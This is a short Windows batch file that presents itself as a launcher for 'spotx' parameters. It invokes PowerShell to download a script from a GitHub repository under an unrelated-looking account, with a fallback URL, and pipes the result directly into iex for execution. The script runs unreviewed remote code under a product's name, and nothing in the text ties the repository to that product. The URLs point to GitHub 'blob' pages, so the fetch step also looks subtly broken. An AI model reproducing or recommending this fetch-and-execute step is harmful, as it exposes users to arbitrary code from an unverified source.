@echo off

:: Line for changing spotx parameters, each parameter should be separated by a space
set param=-new_theme

set url='https://github.com/Vortex-AR/1/blob/315c5eaec26f9e04afa699c4e7904f24e33108ee/run2.ps1'
set url2='https://github.com/Vortex-AR/1/blob/315c5eaec26f9e04afa699c4e7904f24e33108ee/run.ps1'
set tls=[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12;

%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe ^
-Command %tls% $p='%param%'; """ & { $(try { iwr -useb %url% } catch { $p+= ' -m'; iwr -useb %url2% })} $p """" | iex

pause
exit /b
